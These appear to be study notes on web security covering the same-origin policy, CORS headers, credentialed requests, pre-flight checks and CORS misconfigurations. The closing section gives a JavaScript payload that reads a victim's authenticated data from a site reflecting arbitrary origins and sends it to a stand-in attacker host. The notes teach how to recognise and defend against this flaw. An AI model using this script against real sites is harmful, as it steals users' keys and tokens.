                                        ## What is the same-origin policy?
# The same-origin policy is a web browser security mechanism that aims to prevent websites from attacking each other. 
# The same-origin policy restricts scripts on one origin from accessing data from another origin.
# An origin consists of a URI scheme, domain and port number. For example, consider the following URL: 

                                        ## Relaxation of the same-origin policy
                                        
# The same-origin policy is very restrictive and consequently various approaches have been devised to circumvent the constraints.
# Many websites interact with subdomains or third-party sites in a way that requires full cross-origin access. 
# A controlled relaxation of the same-origin policy is possible using cross-origin resource sharing (CORS). 
# The cross-origin resource sharing protocol uses a suite of HTTP headers that define trusted web origins and associated properties such as whether authenticated access is permitted.
# These are combined in a header exchange between a browser and the cross-origin web site that it is trying to access. 

Example: http://normal-website.com/example/example.html


<> This uses the scheme http, the domain normal-website.com, and the port number 80
<> The following table shows how the same-origin policy will be applied if content at the above URL tries to access other origins: 

                                  URL accessed 	                        Access permitted?
                          http://normal-website.com/example/ 	Yes: same scheme, domain, and port
                          http://normal-website.com/example2/ 	Yes: same scheme, domain, and port
                          https://normal-website.com/example/ 	No: different scheme and port
                          http://en.normal-website.com/example/ 	No: different domain
                          http://www.normal-website.com/example/ 	No: different domain
                          http://normal-website.com:8080/example/ 	No: different port* 



*Internet Explorer will allow this access because IE does not take account of the port number when applying the same-origin policy. 

                                         ## What is CORS (cross-origin resource sharing)?
                                    
# Cross-origin resource sharing (CORS) is a browser mechanism which enables controlled access to resources located outside of a given domain
# It extends and adds flexibility to the same-origin policy (SOP)
# However, it also provides potential for cross-domain attacks, if a website's CORS policy is poorly configured and implemented.
# CORS is not a protection against cross-origin attacks such as cross-site request forgery (CSRF).



                                      ## CORS and the Access-Control-Allow-Origin response header
                                      
 # The cross-origin resource sharing specification provides controlled relaxation of the same-origin policy for HTTP requests to one website domain from another through the use of a collection of HTTP headers.
 # Browsers permit access to responses to cross-origin requests based upon these header instructions.
 
                                        ## What is the Access-Control-Allow-Origin response header?
                                        
# The Access-Control-Allow-Origin header is included in the response from one website to a request originating from another website, and identifies the permitted origin of the request.
# A web browser compares the Access-Control-Allow-Origin with the requesting website's origin and permits access to the response if they match. 

                                          ## Implementing simple cross-origin resource sharing 
#  For example, suppose a website with origin normal-website.com causes the following cross-domain request: 

                                          GET /data HTTP/1.1
                                          Host: robust-website.com
                                          Origin : https://normal-website.com
#  The server on robust-website.com returns the following response: 

                                            HTTP/1.1 200 OK
                                            ...
                                            Access-Control-Allow-Origin: https://normal-website.com
                                      
# The browser will allow code running on normal-website.com to access the response because the origins match. 
# The specification of Access-Control-Allow-Origin allows for multiple origins, or the value null, or the wildcard *.
# However, no browser supports multiple origins and there are restrictions on the use of the wildcard *. 


                                             ## Handling cross-origin resource requests with credentials
                                             
# The default behavior of cross-origin resource requests is for requests to be passed without credentials like cookies and the Authorization header. 
# However, the cross-domain server can permit reading of the response when credentials are passed to it by setting the CORS Access-Control-Allow-Credentials header to true.
# Now if the requesting website uses JavaScript to declare that it is sending cookies with the request: 

                                                GET /data HTTP/1.1
                                                Host: robust-website.com
                                                ...
                                                Origin: https://normal-website.com
                                                Cookie: JSESSIONID=<value>
#  And the response to the request is: 

                                                HTTP/1.1 200 OK
                                                ...
                                                Access-Control-Allow-Origin: https://normal-website.com
                                                Access-Control-Allow-Credentials: true
                                      
# Then the browser will permit the requesting website to read the response, because the Access-Control-Allow-Credentials response header is set to true.
# Otherwise, the browser will not allow access to the response.  


                                                  ## Relaxation of CORS specifications with wildcards 
                                                  
 #  The header Access-Control-Allow-Origin supports wildcards. For example: Access-Control-Allow-Origin: * 
 
 
Note

Note that wildcards cannot be used within any other value. For example, the following header is not valid:
Access-Control-Allow-Origin: https://*.normal-website.com 

Consequently, a cross-domain server response of the form: 
                              Access-Control-Allow-Origin: *
                              Access-Control-Allow-Credentials: true
is not permitted as this would be dangerously insecure, exposing any authenticated content on the target site to everyone. 


                        
                                                   ## Pre-flight checks 
                                                   
 # The pre-flight check was added to the CORS specification to protect legacy resources from the expanded request options allowed by CORS.
 # Under certain circumstances, when a cross-domain request includes a non-standard HTTP method or headers, the cross-origin request is preceded by a request using the OPTIONS method, and the CORS protocol necessitates an initial check on what methods and headers are permitted prior to allowing the cross-origin request.
 # For example, this is a pre-flight request that is seeking to use the PUT method together with a custom request header called Special-Request-Header: 
 
                                          OPTIONS /data HTTP/1.1
                                          Host: <some website>
                                          ...
                                          Origin: https://normal-website.com
                                          Access-Control-Request-Method: PUT
                                          Access-Control-Request-Headers: Special-Request-Header
                                          
# The server might return a response like the following:  

                                  HTTP/1.1 204 No Content
                                  ...
                                  Access-Control-Allow-Origin: https://normal-website.com
                                  Access-Control-Allow-Methods: PUT, POST, OPTIONS
                                  Access-Control-Allow-Headers: Special-Request-Header
                                  Access-Control-Allow-Credentials: true
                                  Access-Control-Max-Age: 240
                                  
# This response sets out the allowed methods (PUT, POST and OPTIONS) and permitted request headers (Special-Request-Header).
# In this particular case the cross-domain server also allows the sending of credentials, and the Access-Control-Max-Age header defines a maximum timeframe for caching the pre-flight response for reuse.
# Pre-flight checks add an extra HTTP request round-trip to the cross-domain request, so they increase the browsing overhead. 


                          
                          
                                                      ## Vulnerabilities arising from CORS configuration issues
                                                      
# Many modern websites use CORS to allow access from subdomains and trusted third parties.
# Their implementation of CORS may contain mistakes or be overly lenient to ensure that everything works, and this can result in exploitable vulnerabilities. 

  <> Server-generated ACAO header from client-specified Origin header
#  Some applications need to provide access to a number of other domains.
#  Maintaining a list of allowed domains requires ongoing effort, and any mistakes risk breaking functionality.
#  So some applications take the easy route of effectively allowing access from any other domain. 

<> One way to do this is by reading the Origin header from requests and including a response header stating that the requesting origin is allowed.
# For example, consider an application that receives the following request: 

                                                    GET /sensitive-victim-data HTTP/1.1
                                                    Host: vulnerable-website.com
                                                    Origin: https://malicious-website.com
                                                    Cookie: sessionid=...
                                      
                                      
#  It then responds with: 

                                                    HTTP/1.1 200 OK
                                                    Access-Control-Allow-Origin: https://malicious-website.com
                                                    Access-Control-Allow-Credentials: true
                                                    ...
                                                    
# These headers state that access is allowed from the requesting domain (malicious-website.com) and that the cross-origin requests can include cookies (Access-Control-Allow-Credentials: true) and so will be processed in-session. 

# Because the application reflects arbitrary origins in the Access-Control-Allow-Origin header, this means that absolutely any domain can access resources from the vulnerable domain.

# If the response contains any sensitive information such as an API key or CSRF token, you could retrieve this by placing the following script on your website: 

                                                      var req = new XMLHttpRequest();
                                                      req.onload = reqListener;
                                                      req.open('get','https://vulnerable-website.com/sensitive-victim-data',true);
                                                      req.withCredentials = true;
                                                      req.send();

                                                      function reqListener() {
                                                         location='//malicious-website.com/log?key='+this.responseText;
                                                      };

                                      
                                      
                                      


                                
                                            
                                              
